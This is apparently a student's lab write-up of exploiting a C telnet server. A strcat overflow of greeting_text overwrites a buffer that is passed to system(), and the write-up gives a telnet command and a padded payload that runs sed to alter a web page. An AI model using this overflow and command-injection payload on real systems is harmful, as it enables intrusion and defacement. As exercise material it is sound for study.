I've started taking a look at the code to understand what was happening and I got some ideas:
1- serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);//binded to all interfaces, maybe we could exploit that
2- if (listen(listenfd, 10) < 0) {//Mark in listen with a queue up to 10 - maybe exploitable
    perror("listen");
    return -1;
  }
3- strcat(greeting_text, buf);//Possible buffer overflow with size(greeting_text)==128 and size(buf)==256

Exploiting:
1- If we call the telnet in the door 80 we have an access to everything that was there-> my first attempt was to try sending a POST request through it and change the page, but unfortunately it didn't work. It accepted the request but I wasn't able to repost the page (i was thinking about doing a GET to get the actual state of the page and then create and send a POST request similar but with my name added)
2- I thought about trying to use more than 10 request and see what happened when we reached the end of this buffer, but nothing happened
3- Buffer-Overflow exploit possility as in: https://www.youtube.com/watch?v=1S0aBV-Waeo to set a bash command inside the string command an then have it executed by system()

How to exploit:
Using only 3 and the organisation of my stack:
/*Memory Stack
|--------------------------------------|------|-----------------------------------------------------|
    greeting_text                      command     buffer
|                  128                 |  48  |         256                                         |
*/
We overflow greeting_text to get to command and insert commands to have tehm executes in system(command)

Instructions:
1- launch the telnet application -> telnet 192.168.56.101 1234
2- And when it asks for your name you put:
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000cd var/www/html;sed -i 's/<\/body>/<div> "Joaquin Castanon" <\/div><\/body>/' index.html;
3- Enjoy your place among the winners